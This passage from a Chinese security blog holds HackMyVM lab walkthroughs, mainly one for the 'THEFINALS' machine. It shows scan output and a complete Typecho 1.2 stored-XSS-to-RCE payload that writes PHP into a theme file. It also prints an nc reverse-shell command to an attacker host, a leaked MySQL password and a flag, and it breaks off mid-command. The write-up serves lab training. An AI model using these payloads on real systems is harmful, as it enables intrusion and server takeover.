class="hljs-keyword">data</span> = request.get_json()<br>        source_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = <span class="hljs-keyword">data</span>.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> not source_path or not target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;è¯·æä¾›æºæ–‡ä»¶è·¯å¾„å’Œç›®æ ‡è·¯å¾„&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> not os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;æºæ–‡ä»¶ä¸å­˜åœ¨&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        # ç¡®ä¿ç›®æ ‡ç›®å½•å­˜åœ¨<br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> not os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        # ç§»åŠ¨æ–‡ä»¶<br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;æ–‡ä»¶ç§»åŠ¨æˆåŠŸ&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    except Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: str(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=True)<br></code></pre></td></tr></table></figure><p>æƒ³æ³•å¾ˆç¾å¥½ï¼Œä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥&#x2F;tmp&#x2F;app.pyæ—¶ä¼šæç¤ºæˆ‘ä»¬æ–‡ä»¶ä¸å­˜åœ¨</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_Q1oTxq2DEF.png"></p><p>è¿™é‡Œå°±æ˜¯è¿™ä¸ªé¶åœºè€ƒå¯Ÿçš„ä¸€ä¸ªé‡ç‚¹ï¼štmpéš”ç¦»</p><p>å¦‚æœç³»ç»Ÿçš„systemdå¼€å¯äº†PrivateTmpå±æ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡è®¿é—®åˆ°çš„tmpä¸æ˜¯çœŸçš„tmpè·¯å¾„ï¼Œè€Œæ˜¯ä¸€ä¸ªç§æœ‰çš„ç›®å½•ï¼Œè¿™é‡Œå°±æ˜¯ç”±apacheç”Ÿæˆçš„ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“è¿™ä¸ªç›®å½•çš„ç»å¯¹è·¯å¾„æ˜¯åˆ°åº•åœ¨å“ªï¼Œæ‰€ä»¥ä¸èƒ½ç”¨é‚£ä¸ªæ–‡ä»¶ç§»åŠ¨æ¥å¤åˆ¶å®ƒã€‚</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰æ–¹æ³•ç»•è¿‡éš”ç¦»å‘¢ï¼Ÿç­”æ¡ˆå¾ˆç®€å•ï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥è¢«éš”ç¦»æ˜¯å› ä¸ºæˆ‘ä»¬ç”¨çš„æ˜¯apacheè¿™ä¸ªæœåŠ¡ä¸‹é¢çš„å‘½ä»¤æ‰§è¡Œæ¥åå¼¹ï¼Œåªè¦åœ¨å…¶ä»–çš„rceç‚¹åå¼¹å°±è¡Œäº†ã€‚</p><p>æ¯”å¦‚æœ€å¼€å§‹çš„é‚£ä¸ªPOSTæ³¨å…¥ç‚¹ã€‚</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_WttcLSpweQ.png"></p><p><img src="/2025/05/29/HackMyVM-translate/vmware_tLSYNasyst.png"></p><p>ï¼ˆæ„Ÿè°¢HYHå¤§ä½¬å¸®æˆ‘æŒ‡å‡ºé”™è¯¯ï¼Œè‡ªå·±å½“æ—¶çœŸå°¼ç›é“¸å¸å•Šï¼Œèƒ½è¢«è¿™ä¸ªå¡ä¸€ä¸¤ä¸ªå°æ—¶ï¼Œå”‰ã€‚ï¼‰</p><p>é‚£ä¹ˆå°±èƒ½è½»æ¾åŠ æ„‰å¿«çš„è¾“PINè¿›åˆ°consoleåå¼¹shelläº†ï¼Œå‰©ä¸‹çš„æ˜å¤©å†è¡¥å§ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-THEFINALS</title>
    <link href="/2025/05/28/HackMyVM-THEFINALS/"/>
    <url>/2025/05/28/HackMyVM-THEFINALS/</url>
    
    <content type="html"><![CDATA[<p>å¤§ä½¬ç¾¤å‹åšçš„é¶æœºã€‚å…³äºå¦‚ä½•è®¾ç½®VMå’Œvirtualboxè”åŠ¨ç½‘ä¸Šå·²ç»æœ‰å¾ˆè¯¦ç»†çš„æ•™ç¨‹äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚åªæä¸€ç‚¹ï¼Œä¸€å®šè¦ç¡®ä¿é¶æœºç¯å¢ƒå®Œå…¨å¯åŠ¨ä¹‹åå†è¿›è¡Œå‰æœŸçš„å‡†å¤‡å·¥ä½œï¼ˆè¡€çš„æ•™è®­å•Šï¼‰ï¼Œä¸è¿‡ç¾¤å‹åšçš„é¶æœºéƒ½å¾ˆå‹å¥½ï¼ŒIPç›´æ¥ç»™äº†ä¸ç”¨arpscanè´¹äº‹æ‰«ã€‚</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>é¶æœºip:192.168.56.105</p><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.105<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 11:11 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating ARP Ping Scan at 11:11<br>Scanning 192.168.56.105 [1 port]<br>Completed ARP Ping Scan at 11:11, 0.07s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 11:11<br>Completed Parallel DNS resolution of 1 host. at 11:11, 0.03s elapsed<br>Initiating SYN Stealth Scan at 11:11<br>Scanning 192.168.56.105 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.105<br>Discovered open port 80/tcp on 192.168.56.105<br>Completed SYN Stealth Scan at 11:11, 0.10s elapsed (1000 total ports)<br>Initiating Service scan at 11:11<br>Scanning 2 services on 192.168.56.105<br>Completed Service scan at 11:11, 6.08s elapsed (2 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.105</span><br>NSE: Script scanning 192.168.56.105.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.27s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.01s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.105<br>Host is up (0.00076s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.9 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 42:a7:04:bb:da:b5:8e:71:7a:89:ff:a4:60:<span class="hljs-built_in">cd</span>:4d:29 (ECDSA)<br>|_  256 37:32:71:ca:3f:11:41:b4:d7:90:1e:c9:7f:e8:bc:20 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Unix))<br>|_http-title: THE FINALS<br>|_http-server-header: Apache/2.4.62 (Unix)<br>| http-methods: <br>|   Supported Methods: GET POST OPTIONS HEAD TRACE<br>|_  Potentially risky methods: TRACE<br>MAC Address: 08:00:27:BD:74:14 (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 22.031 days (since Tue May  6 10:27:15 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=265 (Good luck!)<br>IP ID Sequence Generation: All zeros<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.76 ms 192.168.56.105<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Initiating NSE at 11:11<br>Completed NSE at 11:11, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.36 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.105/<br><br>[11:14:29] Starting:                                                                                                                    <br>[11:14:29] 301 -  311B  - /js  -&gt;  http://192.168.56.105/js/                <br>[11:14:30] 403 -  277B  - /.ht_wsr.txt                                      <br>[11:14:30] 403 -  277B  - /.htaccess.orig                                   <br>[11:14:30] 403 -  277B  - /.htaccess.bak1<br>[11:14:30] 403 -  277B  - /.htaccess.sample<br>[11:14:30] 403 -  277B  - /.htaccess.save<br>[11:14:30] 403 -  277B  - /.htaccess_extra                                  <br>[11:14:30] 403 -  277B  - /.htaccess_orig<br>[11:14:30] 403 -  277B  - /.htaccess_sc                                     <br>[11:14:30] 403 -  277B  - /.htaccessBAK<br>[11:14:30] 403 -  277B  - /.htaccessOLD<br>[11:14:30] 403 -  277B  - /.htaccessOLD2<br>[11:14:30] 403 -  277B  - /.htm                                             <br>[11:14:30] 403 -  277B  - /.html                                            <br>[11:14:30] 403 -  277B  - /.htpasswd_test                                   <br>[11:14:30] 403 -  277B  - /.htpasswds<br>[11:14:30] 403 -  277B  - /.httr-oauth<br>[11:14:37] 301 -  313B  - /blog  -&gt;  http://192.168.56.105/blog/            <br>[11:14:37] 200 -   17KB - /blog/                                            <br>[11:14:37] 200 -  820B  - /cgi-bin/printenv                                 <br>[11:14:37] 200 -    1KB - /cgi-bin/test-cgi                                 <br>[11:14:38] 301 -  312B  - /css  -&gt;  http://192.168.56.105/css/              <br>[11:14:40] 301 -  314B  - /fonts  -&gt;  http://192.168.56.105/fonts/          <br>[11:14:41] 200 -  607B  - /images/                                          <br>[11:14:41] 301 -  315B  - /images  -&gt;  http://192.168.56.105/images/<br>[11:14:42] 200 -  695B  - /js/                                              <br>[11:14:47] 301 -  320B  - /screenshots  -&gt;  http://192.168.56.105/screenshots/<br>[11:14:52] 403 -  277B  - /server-status/                                   <br>[11:14:52] 403 -  277B  - /server-status             <br></code></pre></td></tr></table></figure><p>å¼€æ”¾80ç«¯å£ï¼Œæ‰«åˆ°çš„å¯è®¿é—®ç•Œé¢ä¸å°‘ï¼Œæµè§ˆå™¨æŒ¨ä¸ªè®¿é—®ä¸€ä¸‹ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_PvS2gpMdrb.png"></p><p>è¿™äº›å›¾ç‰‡ç‚¹è¿›å»åªæ˜¯å›¾ç‰‡ï¼Œæ²¡ä»€ä¹ˆéšå†™ä¹‹ç±»çš„ï¼Œå¦å¤–ä¸¤ä¸ªç‚¹è¿›å»ä¹Ÿéƒ½æ— æ³•è®¿é—®ã€‚</p><p>è®¿é—®&#x2F;imagesï¼Œçœ‹åˆ°è¿™é‡Œæ˜¯å­˜æ”¾å›¾ç‰‡çš„ç›®å½•ï¼Œæ²¡æœ‰å…¶ä»–ä¸œè¥¿ï¼Œapacheç‰ˆæœ¬2.462ï¼Œä¹Ÿæ²¡æœ‰æ´å¯ä»¥æ‰“ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_kpAyGZ2Nni.png"></p><p>ä¹‹åè®¿é—®&#x2F;screenshotsï¼Œç»ˆäºæœ‰äº†ä¸€ç‚¹èµ·è‰²ï¼Œè¿™é‡Œçš„æˆªå±æ˜¾ç¤ºäº†ä¸€ä¸ªåšå®¢æ¡†æ¶çš„åç§°å’Œç‰ˆæœ¬å·ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_eBNFTGQFsz.png"></p><p>è®¿é—®&#x2F;blogï¼Œçœ‹å‡ºè¿™ä¸ªç½‘ç«™æ˜¯ç”¨çš„ä¸Šé¢æåˆ°çš„æ¡†æ¶æ­å»ºçš„ï¼Œå¾ˆæ˜æ˜¾æ˜¯è®©æˆ‘ä»¬æ‰¾è¿™é‡Œçš„expã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XSsBYn7cxa.png"></p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p>æœç´¢Typecho 1.2.0ï¼Œå¾—åˆ°exp:</p><p><a href="https://blog.csdn.net/m0_73299839/article/details/131939670">typechoå­˜å‚¨å‹xssæ¼æ´å¤ç°_å­˜å‚¨å‹xssæ¼æ´æ— äº¤äº’-CSDNåšå®¢</a></p><p><a href="https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html">Typecho1.2 - 1.2.1-rcå‰å°è¯„è®ºå­˜å‚¨xssåˆ°rce æ¼æ´å¤ç°-åˆ†æ-ä¿®å¤ - JunBlog</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨ç½‘é¡µæœ«å°¾æ’å…¥ä¸€ä¸ªiframeå…ƒç´ </span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">insertIframe</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// è·å–å½“å‰é¡µé¢è·¯å¾„</span><br>    <span class="hljs-keyword">var</span> urlWithoutDomain = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">pathname</span>;<br>    <span class="hljs-comment">// åˆ¤æ–­é¡µé¢æ˜¯å¦ä¸ºè¯„è®ºç®¡ç†é¡µé¢</span><br>    <span class="hljs-keyword">var</span> hasManageComments = urlWithoutDomain.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;manage-comments.php&quot;</span>);<br>    <span class="hljs-keyword">var</span> tSrc=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (hasManageComments)&#123;<br>        <span class="hljs-comment">// å¦‚æœæ˜¯ï¼Œåˆ™å°†è·¯å¾„ä¿®æ”¹ä¸ºç”¨äºä¿®æ”¹ä¸»é¢˜æ–‡ä»¶çš„é¡µé¢åœ°å€</span><br>        tSrc=urlWithoutDomain.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;manage-comments.php&#x27;</span>,<span class="hljs-string">&#x27;theme-editor.php?theme=default&amp;file=404.php&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// å¦‚æœä¸æ˜¯ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ä¸»é¢˜æ–‡ä»¶ä¿®æ”¹é¡µé¢åœ°å€</span><br>        tSrc=<span class="hljs-string">&#x27;/admin/theme-editor.php?theme=default&amp;file=404.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-comment">// å®šä¹‰iframeå…ƒç´ çš„å±æ€§ï¼ŒåŒ…æ‹¬idã€srcã€widthã€heightå’Œonloadäº‹ä»¶</span><br>    <span class="hljs-keyword">var</span> iframeAttributes = <span class="hljs-string">&quot;&lt;iframe id=&#x27;theme_id&#x27; src=&#x27;&quot;</span>+tSrc+<span class="hljs-string">&quot;&#x27; width=&#x27;0%&#x27; height=&#x27;0%&#x27; onload=&#x27;writeShell()&#x27;&gt;&lt;/iframe&gt;&quot;</span>;<br>    <span class="hljs-comment">// è·å–ç½‘é¡µåŸå§‹å†…å®¹</span><br>    <span class="hljs-keyword">var</span> originalContent = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-comment">// åœ¨ç½‘é¡µæœ«å°¾æ·»åŠ iframeå…ƒç´ </span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = (originalContent + iframeAttributes);<br>&#125;<br><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡isSavedï¼Œåˆå§‹å€¼ä¸ºfalse</span><br><span class="hljs-keyword">var</span> isSaved = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨iframeä¸­å†™å…¥ä¸€æ®µPHPä»£ç å¹¶ä¿å­˜</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">writeShell</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// å¦‚æœisSavedä¸ºfalse</span><br>    <span class="hljs-keyword">if</span> (!isSaved) &#123; <br>        <span class="hljs-comment">// è·å–iframeå†…çš„å†…å®¹åŒºåŸŸå’Œâ€œä¿å­˜æ–‡ä»¶â€æŒ‰é’®å…ƒç´ </span><br>        <span class="hljs-keyword">var</span> content = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;content&#x27;</span>);<br>        <span class="hljs-keyword">var</span> btns = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;theme_id&#x27;</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;button&#x27;</span>);    <br>        <span class="hljs-comment">// è·å–æ¨¡æ¿æ–‡ä»¶åŸå§‹å†…å®¹</span><br>        <span class="hljs-keyword">var</span> oldData = content.<span class="hljs-property">value</span>;<br>        <span class="hljs-comment">// åœ¨åŸå§‹å†…å®¹å‰åŠ å…¥ä¸€æ®µphpinfoä»£ç </span><br>        content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;\n&#x27;</span>) + oldData;<br>        <span class="hljs-comment">// ç‚¹å‡»â€œä¿å­˜æ–‡ä»¶â€æŒ‰é’®</span><br>        btns[<span class="hljs-number">1</span>].<span class="hljs-title function_">click</span>();<br>        <span class="hljs-comment">// å°†isSavedè®¾ä¸ºtrueï¼Œè¡¨ç¤ºå·²ç»å®Œæˆå†™å…¥æ“ä½œ</span><br>        isSaved = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// è°ƒç”¨insertIframeå‡½æ•°ï¼Œå‘ç½‘é¡µä¸­æ·»åŠ iframeå…ƒç´ å’Œå†™å…¥PHPä»£ç çš„äº‹ä»¶</span><br><span class="hljs-title function_">insertIframe</span>();<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://xxx.xxx.com/<span class="hljs-string">&quot;&gt;&lt;/a&gt;&lt;script/src=http://192.168.56.104:8000/shell.js&gt;&lt;/script&gt;&lt;a/href=&quot;</span>#<br></code></pre></td></tr></table></figure><p>ç‚¹å¼€æ–‡ç« è¿›è¡Œè¯„è®ºï¼Œçœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸä¸Šä¼ äº†æ–‡ä»¶ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_4t6uYI8d13.png"></p><p>æŸ¥çœ‹expä¸­çš„åœ°å€&#x2F;usr&#x2F;blog&#x2F;theme&#x2F;default&#x2F;404.phpï¼Œæˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†phpinfoã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_h6eUy3YBx5.png"></p><p>é‚£æ¥ä¸‹æ¥å°±æ˜¯çˆ½çˆ½çš„getshelläº†ï¼Œä¼ ä¸ªpostä¸€å¥è¯å†°èçˆ½è¿â€¦â€¦å¥½å§çˆ½è¿ä¸äº†ï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œåªèƒ½åå¼¹shelläº†ã€‚</p><p>ä½†æ˜¯bashæ²¡ååº”ã€‚</p><p>æŠŠexpæ”¹ä¸€ä¸‹æ”¹æˆread &#x2F;etc&#x2F;passwdï¼ŒæŸ¥çœ‹é¶æœºç”¨çš„shellåï¼Œç”¨çš„æ˜¯ashã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">content.<span class="hljs-property">value</span> = (<span class="hljs-string">&#x27;&lt;?php exec(&quot;nc 192.168.56.104 9000 -e /bin/ash&quot;); ?&gt;\n&#x27;</span>) + oldData;<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_7pu2B4xxMb.png"></p><p>æŸ¥çœ‹å†…éƒ¨ç”¨æˆ·å</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_ClVQYvBwBt.png"></p><p>juneç”¨æˆ·ç›®å½•æ˜¯ä»»æ„ç”¨æˆ·å¯è®¿é—®çš„ï¼Œcdåˆ°ä»–çš„ç›®å½•ä¸‹æ‹¿åˆ°userflag</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XTmKlbv2Vq.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userï¼šflag&#123;4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298&#125;<br></code></pre></td></tr></table></figure><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><hr><p>å†å›åˆ°æˆ‘ä»¬ä¸€å¼€å§‹æ‹¿åˆ°shellçš„ç›®å½•ä¸‹ï¼Œfindä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰èƒ½åˆ©ç”¨çš„ææƒæ–‡ä»¶ï¼Œçœ‹äº†ä¸€ä¸‹æ²¡æœ‰ï¼Œä½†æ˜¯ç›®å½•ä¸‹æœ‰ä¸€ä¸ªconfig.phpï¼Œå†…å®¹æ˜¯mysqlçš„ç”¨æˆ·é…ç½®ï¼Œäºæ˜¯æƒ³åˆ°åˆ©ç”¨mysqlç™»å½•è·å–æ•°æ®åº“é‡Œçš„ä¿¡æ¯ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_D4ODBatHvI.png"></p><p>ç»™äº†userï¼Œpasswdï¼Œdatabaseï¼Œdbçš„æƒé™ä¹Ÿå†™å¥½äº†ï¼Œç›´æ¥ç™»å½•å°±å¥½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u typecho_u -pQLTkbviW71CSRZtGWIQ<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ncåå¼¹çš„ç›²shellç™»å½•mysqlè€æ˜¯å»¶è¿Ÿå›æ˜¾ï¼Œåªæœ‰åœ¨exitçš„æƒ…å†µä¸‹ä¼šæŠŠè¡¨æ˜¾ç¤ºå‡ºæ¥ï¼Œæ°”ä¸è¿‡å›å¤´é‡æ–°ç”¨ptyç™»äº†ä¸€æ¬¡ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ptyæ˜¯ä¸€ä¸ªpythonåº“ï¼Œç”¨äºæ¨¡æ‹Ÿç»ˆç«¯ç™»å½•è¿‡ç¨‹ï¼Œæ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨äºå‡çº§ç›²shellï¼Œæ¬ºéª—å‘½ä»¤è®©å®ƒä»¬ä»¥ä¸ºè‡ªå·±åœ¨æ­£ç¡®çš„ç»ˆç«¯ä¸­è¢«æ‰§è¡Œ<br></code></pre></td></tr></table></figure><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_XW7n771wDO.png"></p><p><img src="/2025/05/28/HackMyVM-THEFINALS/vmware_99yRkyGWtx.png"></p><p>okæˆ‘ä»¬æŠŠä¸Šé¢staffç”¨æˆ·çš„å“ˆå¸Œæ‹¿åˆ°äº†ï¼Œhashcatå¯åŠ¨ã€‚</p><p>è«å¾—ã€‚</p><p><img src="/2025/05/28/HackMyVM-THEFINALS/WindowsTerminal_K6lRz3Ommm.png"></p><p>åªèƒ½å†å›åˆ°shellé‡Œï¼ŒåˆšåˆšfindæŸ¥è¯¢permæ²¡æœ‰ç»“æœï¼Œé‚£è¿™ä¸€æ¬¡çœ‹ä¸€çœ‹å„è‡ªç”¨æˆ·æœ‰æ²¡æœ‰ä»€ä¹ˆæ–‡ä»¶å¯ä»¥åˆ©ç”¨ã€‚</p><p>é€šè¿‡æŸ¥è¯¢ç”¨æˆ·scottyæ‹¥æœ‰çš„æ–‡ä»¶å‘ç°äº†ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / 